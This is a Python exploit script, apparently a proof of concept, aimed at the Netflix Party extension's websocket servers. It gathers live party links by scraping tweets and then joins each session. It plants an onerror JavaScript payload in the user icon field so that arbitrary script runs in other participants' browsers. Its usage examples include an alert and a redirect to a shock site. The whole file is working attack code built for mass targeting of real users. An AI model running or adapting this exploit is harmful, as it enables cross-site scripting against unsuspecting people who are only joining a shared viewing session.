#!/usr/bin/env python3

#--------------------------------[__docstring__]-------------------------------#
"""
# Netflixparty XSS exploit tool
#
# Talks to Netflixparty websockets to exploit XSS, does not require Netflix account
#
# Usage examples:
#     python ./np_exploit.py --nTweets 10 exploit "alert(1337)"
#     ./np_exploit.py --targetUrl $npurl exploit "location.href='meatspin.com'"
#
# Valid URL example
#     https://www.netflix.com/watch/00000000?npSessionId=0000000000000000&npServerId=s000
#
# Exploit poc:
#   chrome.storage.local.set({"userIcon": 'x" onerror=alert(1)'})
#
# NOTE: message functionality is a bit fragile, I had it working but I have no idea what broke it...
"""
#-----------------------------------[Imports]----------------------------------#
import sys
import time
import socketio
import argparse
import datetime
import urllib.parse as urlparse
from urllib.parse import parse_qs
from twitterscraper import query_tweets

#---------------------------------[Definitions]--------------------------------#
ws = socketio.Client()
userId = None

#----------------------------------[Functions]---------------------------------#
def write_log(msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")
    print("[{}] {}".format(timestamp, msg))

def scrape_parties(n):
    """twitterscraper for netflix.com/watch"""

    tomorrow = datetime.date.today() + datetime.timedelta(days=1)

    # get n tweets with query string in them
    tweets = query_tweets(query = "netflix.com/watch", limit=n, poolsize=1, enddate=tomorrow)
    
    # list of party urls
    parties = []

    for tweet in tweets:
        url = tweet.links[0]
        if len(url) > 80:
            parties.append(url)

    return parties

@ws.event
def connect():
    write_log("[+] connected")

@ws.event
def disconnect():
    write_log("[x] disconnected")

@ws.on("userId")
def rcv_userId(data):
    global userId
    write_log(f"[-] userId: {data}")
    userId = data

@ws.on("updateSettings")
def rcv_updateSettings(data):
    write_log(f"[i] updateSettings: {data}")

@ws.on("sendMessage")
def rcv_message(data): 
    write_log(f"[>] message: {data}")

@ws.on("setPresence")
def rcv_setPresence(data):
    write_log(f"[-] setPresence: {data}")

@ws.on("update")
def rcv_update(data):
    write_log(f"[-] update: {data}")

#---------------------------------[Main Logic]---------------------------------#
def main(arguments):
    """main logic"""
    global ws, userId
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--targetUrl",
                        help="Full Netflix URL with npSessionId and npServerId")
    group.add_argument("--nTweets",
                        help="Number of recent tweets to scrape for parties")
    parser.add_argument("-n")
    parser.add_argument("-U", "--userNickname",
                        help="Custom userNickname, default value is 1337")
    
    # Add subparsers for available options
    sp = parser.add_subparsers(dest="option")

    sp_msg = sp.add_parser("message", help="send message to chat")
    sp_msg.add_argument("msg", help="Message body")

    sp_exe = sp.add_parser("exploit", help="exploit xss and run JavaScript")
    sp_exe.add_argument("js", help="JavaScript code to run. Note: it will be inside onerror=")

    args = parser.parse_args(arguments)

    # Main logic
    if args.targetUrl is None:
        targets = scrape_parties(int(args.nTweets))
    else:
        targets = [args.targetUrl]

    for targetUrl in targets:
        write_log("[-] Target: {}".format(targetUrl))
        parsedUrl = urlparse.urlparse(targetUrl)

        try:
            target_ws = "https://{}.netflixparty.com/".format(parse_qs(parsedUrl.query)["npServerId"][0])
            sessionId = parse_qs(parsedUrl.query)["npSessionId"][0]
        except:
            continue

        ws.connect(target_ws, transports=['websocket'])
        time.sleep(3)
        userSettings = {
            "recentlyUpdated": True,
            "userId": userId,
            "userIcon": None,
            "userNickname": "1337" if args.userNickname is None else args.userNickname
        }
        
        if args.option == "exploit":
            payload = f"\" onerror=\"{args.js}"
            userSettings["userIcon"] = payload

        joinData = {
            "sessionId": sessionId,
            "permId": userId,
            "userSettings": userSettings
        }

        write_log(joinData)
        ws.emit("joinSession", joinData)
        time.sleep(2)
        ws.emit("broadcastUserSettings", userSettings)

        if args.option == "message":
            write_log("sending msg")
            msg_body = {
                "body": args.msg,
                "isSystemMessage": False,
                "timestamp": 1585771298306,
                "userId": userId,
                "permId": userId,
                "userIcon": userSettings["userIcon"],
                "userNickname": userSettings["userNickname"]
            }
            ws.emit("sendMessage", msg_body)

        ws.emit("leaveSession")
        ws.disconnect()
    return

if __name__ == '__main__':
    sys.exit(main(sys.argv[1:]))
